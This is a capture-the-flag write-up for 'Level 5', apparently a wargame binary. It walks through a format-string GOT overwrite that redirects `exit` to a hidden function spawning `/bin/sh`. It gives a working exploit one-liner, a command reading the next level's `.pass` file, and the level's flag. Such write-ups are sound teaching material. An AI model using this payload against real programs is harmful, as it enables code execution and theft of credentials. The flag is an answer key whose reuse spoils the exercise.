# Level 5

**Vulnerability:** Format string → GOT/exit overwrite to call a dead function.

## Walkthrough

`n()` does `printf(buf)` directly then calls `exit(1)`. An unused `o()` at
`0x080484a4` calls `system("/bin/sh")` but is never reached.

The trick: overwrite the `exit` entry (`0x08049838`) so that when `n()` calls `exit`,
it jumps into `o()` instead.

Our buffer appears at **stack position 4** (`41414141` at `%4$x`).

Write `o`'s address `0x080484a4` into `exit`'s slot as two 16-bit `%hn` halves:

- write `0x84a4` to `0x08049838`
- write `0x0804` to `0x0804983a`

Padding math: `0x84a4 = 33956`, minus 8 bytes already printed (two addresses) = `33948`;
`0x10804 = 67588`, minus `33956` = `33632`.

Layout: `[addr_low][addr_high][%33948x][%4$hn][%33632x][%5$hn]`.

## Exploit

```sh
(printf '\x38\x98\x04\x08\x3a\x98\x04\x08%%33948x%%4$hn%%33632x%%5$hn'; cat) | ./level5
cat /home/user/level6/.pass
```

**Flag:** `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
